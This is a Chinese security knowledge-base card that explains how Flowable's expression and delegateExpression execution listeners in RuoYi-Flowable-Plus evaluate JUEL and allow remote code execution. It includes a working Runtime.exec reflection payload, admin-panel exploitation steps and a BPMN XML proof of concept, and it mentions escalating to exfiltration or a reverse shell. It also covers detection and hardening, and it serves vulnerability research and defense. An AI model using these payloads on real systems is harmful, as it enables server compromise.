---
id: web-java-expression-flowable-expression-listener-juel-rce
title: Flowable expression/delegateExpression 监听器：implementation 直接作为 JUEL 表达式求值，流程启动即 RCE
type: scenario
domain: web
path: web/java/expression
technique: flowable-expression-listener-juel-rce
tags:
- java
- flowable
- expression-injection
- juel
- el
- bpmn
- ruoyi
- rce
cve: []
severity: high
confidence: high
affected_versions: RuoYi-Flowable-Plus v0.8.3
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V404
  verified_at: '2026-11-09T13:29:28+08:00'
  notes: 已对照原文方法二与图 15-17/35-38 核对：监听器类型表达式或代理表达式，implementation/表达式字段直接交 DefaultListenerFactory.createExpressionExecutionListener→expressionManager.createExpression→ExpressionExecutionListener.notify→expression.getValue 求值，calc 弹出；delegateExpression 分支 createDelegateExpressionExecutionListener 亦以 createExpression 为前提。与 class 监听器卡为不同类型（无需反射实例化/接口约束），非重复。原文明确使用版本 v0.8.3，已 set-versions。无 sources/URL/文章ID；dedup 均 new。
url: /docs/web/java/expression/web-java-expression-flowable-expression-listener-juel-rce/
draft: false
kb_aliases:
- Flowable 表达式监听器
- ExpressionExecutionListener
- DelegateExpressionExecutionListener
- delegateExpression 注入
- Flowable JUEL 注入
- RuoYi-Flowable-Plus 代理表达式
- BPMN 表达式 RCE
---

## 一句话结论

Flowable 的 BPMN 执行监听器支持 `expression` 与 `delegateExpression` 两种实现类型：引擎直接调用 `expressionManager.createExpression(listener.getImplementation())` 把 `implementation` 字符串解析为表达式，之后在监听器 `notify` 时 `expression.getValue(execution)` 求值。若流程定义可控，把“表达式/代理表达式”填成 `${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('calc.exe')}`，流程一启动就会在服务器 JVM 内执行任意 EL（JUEL），无需 class 监听器那套反射实例化。

## 原理

- **分派与创建**：`ListenerNotificationHelper#executeExecutionListeners` 按 `implementationType` 分支：`expression` → `DefaultListenerFactory.createExpressionExecutionListener(listener)`，内部 `new ExpressionExecutionListener(expressionManager.createExpression(listener.getImplementation()))`；`delegateExpression` → `createDelegateExpressionExecutionListener`，同样先 `expressionManager.createExpression(implementation)`，再把结果包进 `DelegateExpressionExecutionListener`。
- **求值点**：`ExpressionExecutionListener` 持有 `protected Expression expression`，`notify(DelegateExecution execution)` 中执行 `this.expression.getValue(execution)`。`delegateExpression` 的监听器则先对表达式求值得到委托对象，再调用该对象的执行逻辑；两者都以“先把 implementation 当表达式解析”为前提。
- **JUEL 的能力**：Flowable 默认用 JUEL 解析 `${...}`/`#{...}`。JUEL 表达式可以调用对象方法、访问静态方法（通过 `''.getClass()` 拿 `Class`，再 `forName` 取 `java.lang.Runtime`，`getMethod('getRuntime').invoke(null)` 调用静态方法），因此 `${...exec('calc.exe')}` 能直接启动进程。调试环境中该表达式被包成 `JuelExpression`，与 `expressionManager.createExpression` 的行为一致。
- **与 class 监听器的区别**：不需要找到带 Expression 字段且实现 JavaDelegate/ExecutionListener 的类，也没有 public 无参构造/接口实现约束；只需要流程设计器允许把监听器类型设为“表达式”或“代理表达式”。因此它是最短的一条利用链：一个字段、一个 payload。
- **为什么在若依后台成立**：RuoYi-Flowable-Plus 的流程设计器把 Flowable 的 `flowable:executionListener expression="..."` / `delegateExpression="..."` 暴露为可视化配置项，后台用户填写后保存并部署即可写入流程定义；发起流程时 start 事件触发监听器，表达式在服务器端求值。

## 触发条件

- 目标使用 Flowable 6.x（调试环境为 flowable-engine 6.8.0），流程引擎使用默认 JUEL 表达式管理器。
- 攻击者能访问 BPMN 流程设计/部署功能（RuoYi-Flowable-Plus 后台账号，具备流程模型与部署权限）。
- 监听器实现类型可选“表达式”或“代理表达式”，且部署时未对 `${}`/`#{` 内容做禁用或白名单校验。
- 流程定义被部署且流程被发起，start（或对应事件）监听器被触发。

## 利用步骤

1. 登录后台，进入“流程管理 → 流程模型”新建模型并保存。
2. 点击“设计”，创建开始事件，添加“执行监听器”：
   - 事件类型：`start`
   - 监听器类型：`表达式`
   - 表达式：`${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('calc.exe')}`
   也可把监听器类型改为“代理表达式”，在“代理表达式”字段填入同一 payload。
3. 保存流程，回到模型列表点击“部署”使新版本生效。
4. 进入“办公管理 → 新建流程”发起该流程并提交，start 监听器求值，命令执行。
5. 需要回显/持久化时，把 payload 换成写文件、curl/DNS 外带、反弹 shell 等；Windows 目标先用 `calc.exe` 验证。

## PoC

等价的 BPMN 片段：

```xml
<startEvent id="start">
  <extensionElements>
    <!-- 表达式监听器 -->
    <flowable:executionListener event="start"
      expression="${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('calc.exe')}"/>
    <!-- 或代理表达式监听器 -->
    <flowable:executionListener event="start"
      delegateExpression="${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('calc.exe')}"/>
  </extensionElements>
</startEvent>
```

payload 结构说明：`''.getClass()` → `String.class`；`forName('java.lang.Runtime')` → Runtime 类；`getMethod('getRuntime').invoke(null)` → 调用静态 `getRuntime()`；最后 `.exec(...)` 执行命令。JUEL 的反射链无需额外上下文对象。

## 变体与关联

- **class 监听器 + Expression 字段**：当 `expression` 类型被禁用时，可改用 class 监听器指定带 Expression 字段的类（如 NoOpServiceTask），把 payload 放进字段（见关联卡）。
- **script 监听器**：另一种实现类型是 `script`，字段为 script/language，走脚本引擎执行（见脚本监听器卡）。
- **表达式类型差异**：若目标升级 Flowable/改用其他 ExpressionManager，`getClass` 等反射链可能被限制；可尝试 `#{}` 语法、调用上下文 bean、或改走 delegateExpression 解析到已有 bean。
- **通用 EL 注入**：与 SpEL/OGNL/EL 注入面一致，检测时可在 BPMN XML 中搜 `expression=`/`delegateExpression=` 与 `${`/`#{`。

## 检测与防御

- **部署校验**：在流程部署入口解析 BPMN XML，禁止 `flowable:executionListener` 的 `expression`/`delegateExpression` 属性包含 `${`/`#{`，或只允许解析到固定白名单 bean；对监听器类型做白名单。
- **表达式沙箱**：自定义 ExpressionManager/ELResolver，禁止 `getClass`、`Class.forName`、`getMethod`、`invoke` 等成员访问；使用 Flowable 的安全表达式实现或限制 JUEL 函数。
- **权限**：流程设计、部署、发起分别做 RBAC；后台账号不共享；对新增/修改流程定义做审批与审计。
- **监控**：监控 BPMN 部署与流程启动事件，告警新流程定义中出现 expression/delegateExpression 监听器；定期扫描 `ACT_GE_BYTEARRAY`/部署表中的流程 XML。
- **应急**：清理可疑流程定义与部署版本，回滚到可信版本；检查服务器进程/外联告警，确认是否已执行命令。
